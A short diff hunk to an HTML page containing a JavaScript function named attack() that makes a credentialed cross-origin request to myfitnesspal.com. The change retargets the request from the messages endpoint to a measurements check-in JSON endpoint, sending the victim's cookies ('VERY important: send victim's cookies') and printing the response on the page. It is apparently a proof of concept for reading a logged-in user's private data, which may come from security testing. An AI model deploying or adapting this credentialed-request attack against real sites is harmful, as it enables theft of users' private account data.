@@ -8,10 +8,10 @@
   <script>
     async function attack() {
       try {
-        const res = await fetch("https://www.myfitnesspal.com/messages/new", {
-          method: "GET",
-          credentials: "include" // VERY important: send victim's cookies
-        });
+        const res = await fetch("https://www.myfitnesspal.com/measurements/check-in.json", {
+  method: "GET",
+  credentials: "include"
+});
 
         const text = await res.text();
         document.getElementById("output").innerText = text;
